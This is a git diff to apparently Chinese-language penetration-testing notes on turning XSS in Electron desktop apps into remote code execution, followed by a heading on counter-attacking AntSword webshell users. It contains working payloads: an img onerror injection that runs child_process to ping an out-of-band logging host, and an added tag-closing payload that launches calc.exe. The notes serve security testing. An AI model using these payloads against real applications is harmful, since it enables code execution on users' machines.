@@ -7,7 +7,17 @@
 <img src=x onerror="const{exec}=require('child_process');exec('ping rce.2qytvx.ceye.io');">
 const{exec}=require('child_process');exec('ping rce.2qytvx.ceye.io');
 ```
+查看桌面软件是不是Electron开发：一般看安装包里文件 <https://blog.csdn.net/smileyan9/article/details/130383406>
 
+闭合桌面软件标签，RCE：
+```
+<img/src="1"/onerror=eval(`require("child_process").exec("calc.exe");`);>">
+```
+![](.topwrite/assets/image_1742556925644.png)
+
+
+
+^
 ## **Antsword蚁剑反制**
 蓝队通过修改后门的代码实现获得蚁剑使用者的权限
 复现环境：
